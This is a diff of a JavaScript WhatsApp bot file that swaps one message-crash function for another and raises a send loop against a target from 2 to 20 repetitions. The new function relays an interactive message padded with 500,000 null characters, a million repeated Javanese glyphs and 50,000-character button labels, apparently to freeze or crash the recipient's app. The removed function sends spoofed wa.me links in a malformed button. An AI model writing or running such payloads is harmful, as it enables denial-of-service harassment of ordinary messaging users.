@@ -3394,12 +3394,12 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 2; i++) {
+            for (let i = 0; i < 20; i++) {
                 try {
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await VnXNewForceClickUrl(sock, target);
+                    await danylukman(sock, target);
                     await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4524,29 +4524,40 @@ async function VogueDelay(sock, target) {
   }
 }
 
-async function VnXNewForceClickUrl(sock, target) {
-  await sock.relayMessage(target, {
-    interactiveMessage: {
-      body: {
-        text: "",
-        format: 1
-      },
-      footer: {
-        text: ""
-      },
-      nativeFlowMessage: {
-        buttons: [
-          {
-           name: "cta_url",
-            buttonParamsJson: JSON.stringify({
-              display_text: "VnX Is Here",
-              url: "{\"display_text\":\"ⓘ ⸸VnX\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,VnX\"}"
-              }),
-          }
-        ]
-      }
-    }
-  }, { participant: { jid: target } });
+async function danylukman(sock, target) {
+    const msg = {
+        interactiveMessage: {
+            nativeFlowMessage: {
+                messageParamsJson: JSON.stringify({
+                    data: "\u0000".repeat(500000),
+                    list: Array(1000).fill("ꦾ".repeat(1000))
+                }),
+                
+                buttons: [
+                    {
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "ꦽ".repeat(50000),
+                            id: i.toString()
+                        })
+                    },
+                    
+                    {
+                        name: "call_permission_request",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "ꦽ".repeat(50000)
+                        })
+                    }
+                ]
+            }
+        },
+        
+        participant: {
+            jid: target
+        }
+    };
+    
+    await sock.relayMessage(target, msg, {});
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
